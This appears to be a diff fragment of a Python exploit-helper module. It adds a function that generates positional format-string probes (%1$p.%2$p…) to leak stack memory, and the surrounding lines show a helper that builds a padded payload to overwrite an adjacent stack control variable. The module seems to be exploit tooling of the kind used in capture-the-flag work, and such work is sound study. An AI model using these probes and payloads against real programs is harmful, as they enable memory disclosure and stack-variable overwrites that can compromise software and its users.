@@ -23,6 +23,11 @@ def build_format_string_probe(num_words: int = 10, offset_start: int = 1) -> str
     return ".".join(f"%{i}$p" for i in range(offset_start, offset_start + num_words))
 
 
+def leak_stack_offsets(num_words: int = 10, offset_start: int = 1) -> str:
+    """Generate positional format string probes to dump stack memory (%1$p.%2$p...)."""
+    return build_format_string_probe(num_words=num_words, offset_start=offset_start)
+
+
 def build_variable_overwrite(padding_len: int, target_val: int, arch: str = "x32") -> bytes:
     """Construct payload overwriting adjacent stack control/gate variable."""
     pad = b"A" * padding_len
